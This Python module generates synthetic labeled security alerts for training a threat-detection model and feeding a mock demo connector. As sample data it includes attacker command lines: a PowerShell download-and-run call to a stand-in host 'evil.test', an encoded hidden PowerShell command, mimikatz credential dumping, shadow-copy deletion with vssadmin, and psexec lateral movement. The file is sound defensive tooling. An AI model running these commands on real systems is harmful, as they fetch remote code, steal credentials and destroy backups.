"""Synthetic alert generator for ML training and demo mock mode.

Generates labeled (threat / false_positive) alerts spanning brute force,
PowerShell abuse, suspicious logins, port scans, and benign activity.
"""
from __future__ import annotations

import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

from faker import Faker

fake = Faker()
Faker.seed(42)
random.seed(42)


def _rand_ip(internal: bool = False) -> str:
    if internal:
        return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return fake.ipv4_public()


def _hour_off_hours() -> tuple[int, bool]:
    h = random.randint(0, 23)
    return h, h < 6 or h >= 22


THREAT_TEMPLATES = [
    ("brute_force_high", "failed_login", "Multiple failed login attempts detected", "high"),
    ("brute_force_critical", "failed_login", "Sustained brute force on admin account", "critical"),
    ("ps_encoded", "powershell_execution", "PowerShell encoded command execution", "high"),
    ("ps_iex_download", "powershell_execution", "PowerShell IEX downloader detected", "critical"),
    ("mimikatz", "process_create", "Possible credential dumping (mimikatz/lsass)", "critical"),
    ("ransomware", "file_create", "Mass file encryption pattern", "critical"),
    ("port_scan", "port_scan", "Network scanning from internal host", "high"),
    ("offhours_admin", "successful_login", "Admin login outside business hours", "medium"),
    ("psexec", "lateral_movement", "PsExec service install on remote host", "high"),
]

FP_TEMPLATES = [
    ("legit_login", "successful_login", "User login from known device", "low"),
    ("admin_maintenance", "service_install", "Scheduled maintenance service install", "low"),
    ("dev_powershell", "powershell_execution", "Developer PowerShell session", "medium"),
    ("typo_failed", "failed_login", "Single failed login then success", "low"),
    ("backup_job", "process_create", "Nightly backup job process", "info"),
    ("av_scan", "process_create", "Endpoint antivirus scan", "low"),
]


def _make_threat() -> dict[str, Any]:
    template = random.choice(THREAT_TEMPLATES)
    key, et, title, severity = template
    h, off = _hour_off_hours()
    alert: dict[str, Any] = {
        "source_id": f"mock-{uuid.uuid4()}",
        "source": "mock",
        "title": title,
        "description": title + " — investigate.",
        "severity": severity,
        "event_type": et,
        "src_ip": _rand_ip(internal=random.random() < 0.4),
        "dst_ip": _rand_ip(internal=True),
        "user": random.choice(["jdoe", "admin", "svc_backup", "root", "mona", "operator"]),
        "host": f"WIN-{fake.lexify('?????').upper()}",
        "hour_of_day": h,
        "is_off_hours": off,
        "failed_login_count": 0,
        "process_name": None,
        "command_line": None,
        "occurred_at": (datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 60))).isoformat(),
        "label": "threat",
    }

    if key.startswith("brute_force"):
        alert["failed_login_count"] = random.randint(15, 80)
        alert["event_type"] = "failed_login"
    elif key == "ps_encoded":
        alert["process_name"] = "powershell.exe"
        alert["command_line"] = "powershell.exe -nop -w hidden -enc " + fake.pystr(min_chars=80, max_chars=200)
    elif key == "ps_iex_download":
        alert["process_name"] = "powershell.exe"
        alert["command_line"] = "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.test/x.ps1')\""
    elif key == "mimikatz":
        alert["process_name"] = "mimikatz.exe"
        alert["command_line"] = "mimikatz.exe sekurlsa::logonpasswords"
    elif key == "ransomware":
        alert["process_name"] = "encryptor.exe"
        alert["command_line"] = "vssadmin delete shadows /all /quiet"
    elif key == "port_scan":
        alert["description"] = "nmap scan of /24 subnet"
    elif key == "offhours_admin":
        alert["is_off_hours"] = True
        alert["hour_of_day"] = random.choice([1, 2, 3, 23])
        alert["user"] = "admin"
    elif key == "psexec":
        alert["process_name"] = "psexec.exe"
        alert["command_line"] = "psexec.exe \\\\target -u admin -p Pass123 cmd.exe"

    return alert


def _make_false_positive() -> dict[str, Any]:
    template = random.choice(FP_TEMPLATES)
    key, et, title, severity = template
    h = random.randint(8, 18)  # business hours
    alert: dict[str, Any] = {
        "source_id": f"mock-{uuid.uuid4()}",
        "source": "mock",
        "title": title,
        "description": title + " — appears benign.",
        "severity": severity,
        "event_type": et,
        "src_ip": _rand_ip(internal=True),
        "dst_ip": _rand_ip(internal=True),
        "user": random.choice(["jdoe", "alice", "bob", "dev1", "svc_backup"]),
        "host": f"WIN-{fake.lexify('?????').upper()}",
        "hour_of_day": h,
        "is_off_hours": False,
        "failed_login_count": 1 if key == "typo_failed" else 0,
        "process_name": None,
        "command_line": None,
        "occurred_at": (datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 60))).isoformat(),
        "label": "false_positive",
    }
    if key == "dev_powershell":
        alert["process_name"] = "powershell.exe"
        alert["command_line"] = "powershell.exe Get-Process | Format-Table"
    elif key == "backup_job":
        alert["process_name"] = "backup.exe"
        alert["command_line"] = "backup.exe --schedule daily"
    elif key == "av_scan":
        alert["process_name"] = "MsMpEng.exe"
        alert["command_line"] = "MsMpEng.exe scheduled scan"
    return alert


def generate_dataset(n_threats: int = 1500, n_fp: int = 1500) -> list[dict[str, Any]]:
    """Return a mixed labeled dataset for training."""
    data = [_make_threat() for _ in range(n_threats)] + [_make_false_positive() for _ in range(n_fp)]
    random.shuffle(data)
    return data


def generate_live_batch(n: int = 5, threat_ratio: float = 0.4) -> list[dict[str, Any]]:
    """Return a small batch of unlabeled alerts for the mock connector."""
    out = []
    for _ in range(n):
        a = _make_threat() if random.random() < threat_ratio else _make_false_positive()
        a.pop("label", None)
        out.append(a)
    return out
